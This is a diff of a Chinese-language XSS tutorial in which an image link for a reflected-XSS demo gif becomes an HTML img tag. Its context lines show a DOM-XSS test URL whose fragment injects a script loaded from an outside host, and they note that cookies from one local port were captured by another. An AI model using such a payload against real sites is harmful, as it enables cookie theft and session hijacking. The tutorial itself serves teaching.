@@ -21,7 +21,7 @@ http://127.0.0.1:8080/domTest.html#document.write("<script/src=//askybig.github.
 ```
 可以看到3000 端口的 Cookie 被 3001 拿到了。
 
-![反射型](https://askybig.github.io/ImageStore/reflect.gif)
+<img src="https://github.com/ASkyBig/ImageStore/blob/master/reflect.gif?raw=true" width="200px">
 
 ### 存储型
 
